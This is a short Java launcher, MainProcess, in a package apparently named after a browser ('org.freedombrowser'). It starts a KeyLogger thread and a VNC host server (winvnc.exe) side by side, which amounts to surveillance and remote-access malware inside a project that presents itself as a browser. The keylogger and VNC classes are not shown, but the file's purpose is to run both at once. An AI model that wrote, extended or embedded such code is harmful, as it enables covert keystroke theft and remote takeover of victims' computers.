package org.freedombrowser;

import java.io.File;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class MainProcess {
    public static void main(String[] args) throws URISyntaxException {
        // Create two threads to run Class1 and Class2 concurrently
        Thread thread1 = new Thread(() -> {
            try {
                KeyLogger.main(args);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        });
        Thread thread2 = new Thread(() -> VNCHostServer.main(args));

        // Start both threads
        System.out.println("[MainProcess] Starting Keylogger thread");
        thread1.start();

        System.out.println("[MainProcess] Starting VNCHostServer thread");
        Path VNCServerLocation = Paths.get(getJarDirectory() + "\\winvnc.exe");
        if (Files.exists(VNCServerLocation)) {
            thread2.start();
        } else {
            System.out.println("[MainProcess] Cannot start VNC server as the file");
            System.out.println("[MainProcess] \""+ VNCServerLocation+"\" does not exist!");
        }


        try {
            // Wait for both threads to finish before exiting the main thread
            thread1.join();
            thread2.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    public static String getJarDirectory() throws URISyntaxException {
        String jarPath = VNCHostServer.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();

        return new File(jarPath).getParent();
    }
}